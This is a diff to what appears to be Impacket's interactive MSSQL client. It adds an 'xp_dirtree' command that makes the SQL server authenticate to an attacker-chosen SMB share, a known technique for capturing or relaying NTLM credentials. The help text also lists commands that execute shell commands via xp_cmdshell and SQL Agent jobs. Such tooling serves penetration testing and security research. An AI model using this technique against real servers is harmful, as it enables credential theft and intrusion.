@@ -46,6 +46,7 @@ if __name__ == '__main__':
      disable_xp_cmdshell        - you know what it means
      xp_cmdshell {cmd}          - executes cmd using xp_cmdshell
      sp_start_job {cmd}         - executes cmd using the sql server agent (blind)
+     xp_dirtree {smbserverip}   - forces authentication to a smb share using xp_dirtree
      ! {cmd}                    - executes a local shell cmd
      """) 
 
@@ -95,6 +96,14 @@ if __name__ == '__main__':
             try:
                 self.sql.sql_query("exec sp_configure 'xp_cmdshell', 0 ;RECONFIGURE;exec sp_configure "
                                    "'show advanced options', 0 ;RECONFIGURE;")
+                self.sql.printReplies()
+                self.sql.printRows()
+            except:
+                pass
+
+        def do_xp_dirtree(self, s):
+            try:
+                self.sql.sql_query("EXEC master.sys.xp_dirtree '\\\\%s\\impacket',0,1;" % s)
                 self.sql.printReplies()
                 self.sql.printRows()
             except:
